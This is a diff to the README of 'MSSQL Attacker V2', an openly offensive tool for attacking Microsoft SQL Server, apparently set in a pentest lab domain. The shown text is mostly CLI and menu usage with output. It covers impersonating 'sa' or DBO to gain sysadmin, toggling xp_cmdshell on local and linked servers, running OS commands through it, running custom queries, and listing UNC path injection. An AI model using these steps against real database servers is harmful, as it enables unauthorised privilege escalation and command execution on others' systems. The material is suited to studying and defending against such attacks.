@@ -9,7 +9,6 @@ This tool is intended to carry out well-known attacks on MSSQL database servers.
 
 > Help Menu
 ```c
-Z:\>MSSQLAttacker.exe
 [*] MSSQL Attacker - V2 by Rikunj Sindhwad [CLI MODE] [*]
                 HELP MENU
  USAGE: binary.exe cli -a AttackName -t DatabaseServer -d DatabaseName
@@ -39,9 +38,9 @@ Z:\>MSSQLAttacker.exe
                                 [*] MSSQL Attacker V2 by Rikunj Sindhwad [*]
 
 [1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
-[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
+[4] ImpersonateSA                        [5] Impersonate DBO             [6] Toggle xp_cmdshell
 [7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
-[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell  [12] Custom SQL Query
+[10] ToggleLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell  [12] Custom SQL Query
 [0] Exit Program
 
 [INPUT] Enter Value:
@@ -57,8 +56,8 @@ Z:\>MSSQLAttacker.exe cli -a
         checklinkedserverVersion
         uncpathinject
         getinfo
-        enablecmdshell
-        enablelinkedcmdshell
+        togglecmdshell
+        togglelinkedcmdshell
         execlinkedcmd
         execcmd
         runCustomQuery
@@ -193,7 +192,7 @@ Enter Linked Server: APPSRV01
         Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
 ```
 
-#### Enable xp_cmdshell (Local Server).
+#### Toggle xp_cmdshell (Local Server).
 When `sysadmin` privilege is enabled, this feature will reconfigure settings to enable xp_cmdshell which is the easiest way to execute OS commands.
 
 - [ ] CLI
@@ -204,18 +203,31 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell
 [-] xp_cmdshell enable fail! || Missing Privileges
 
 #Used -impersonateSA to enable impersonation to gain sysadmin priv.
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell -impersonateSA
+Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglecmdshell -impersonateSA
 [+] Auth success!
-[+] Impersonatable Users: sa
-[+] Impersonation Success
-[+] xp_cmdshell enabled
+[-] Value In Use: 0
+[-] xp_cmdshell is disabled
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+[+] xp_cmdshell toggled
 
-#Used -impersonateDBO to enable impersonation to gain sysadmin priv.
+Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglecmdshell -impersonateSA
+[+] Auth success!
+[-] Value In Use: 1
+[-] xp_cmdshell is enabled
+[+] Value In Use: 0
+[+] xp_cmdshell is disabled
+[+] xp_cmdshell toggled
+
+#Used -impersonateDBO to togle impersonation to gain sysadmin priv.
 
 Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell -impersonateDBO -dbo msdb
 [+] Auth success!
-[+] Impersonation As DBO Success
-[+] xp_cmdshell enabled
+[-] Value In Use: 0
+[-] xp_cmdshell is disabled
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+[+] xp_cmdshell toggled
 ```
 
 - [ ] C-GUI 
@@ -223,41 +235,55 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell -imperso
 ```bash
 #Through DBO impersonation
 [INPUT] Enter Value: 5
-Enter Database Name:msdb
+[+] Found Trustworthy Database
 [+] Impersonation As DBO Success
+
 [INPUT] Enter Value: 6
-[+] xp_cmdshell enabled
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+[-] Value In Use: 0
+[-] xp_cmdshell is disabled0
+[+] xp_cmdshell toggled
+
 #Through SA impersonation
-INPUT] Enter Value: 1
-[+] Logged in as: sa
-[+] User is a member of sysadmin role
+INPUT] Enter Value: 4
+[+] Impersonatable Users: sa
+[+] Impersonation Success
 [INPUT] Enter Value: 6
-[+] xp_cmdshell enabled
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+[-] Value In Use: 0
+[-] xp_cmdshell is disabled0
+[+] xp_cmdshell toggled
 
 ```
 
 
-#### Enable xp_cmdshell (Linked Server).
+#### Toggle xp_cmdshell (Linked Server).
 
-The linkedServer might have sysadmin privilege and not the connected database server. This feature enables xp_cmdshell over linkedDBServers.
+The linkedServer might have sysadmin privilege and not the connected database server. This feature toggle xp_cmdshell over linkedDBServers.
 
 
 - [ ] CLI
 ```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablelinkedcmdshell -ls appsrv01
+Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglelinkedcmdshell -ls appsrv01
 [+] Auth success!
+[+] Impersonatable Users: sa
+[+] Impersonation Success
+[+] Linked Server: appsrv01      Value In Use: 1
 [-] Linked Server: appsrv01      Value In Use: 0
-[+] xp_cmdshell enabled
+[+] Linked xp_cmdshell toggled
 ```
 
-- [ ] C-GUI `As already Enabled through CLI`
+- [ ] C-GUI
 
 ```
 
 [INPUT] Enter Value: 10
 Enter Linked Server: APPSRV01
+[-] Linked Server: APPSRV01      Value In Use: 0
 [+] Linked Server: APPSRV01      Value In Use: 1
-[+] xp_cmdshell already enabled
+[+] Linked xp_cmdshell toggled
 ```
 
 #### Command Execution Local (When xp_cmdshell enabled).
@@ -329,4 +355,25 @@ Enter Linked Server: APPSRV01
 [+] Linked xp_cmdshell value_in_use: 1
 Enter Command: ping 192.168.xx.yy
 [+] Command Executed
+```
+#### Custom Query Execution.
+
+- [ ] CLI
+```c
+ .\MSSQLAttackerV2.exe cli  -t dc01 -a runCustomQuery -query 'select @@VERSION'
+[+] Auth success!
+select @@VERSION;
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+        Sep 24 2019 13:48:23
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+```
+- [ ] C-GUI
+```c
+[INPUT] Enter Value: 12
+Query> select @@VERSION
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+        Sep 24 2019 13:48:23
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
 ```
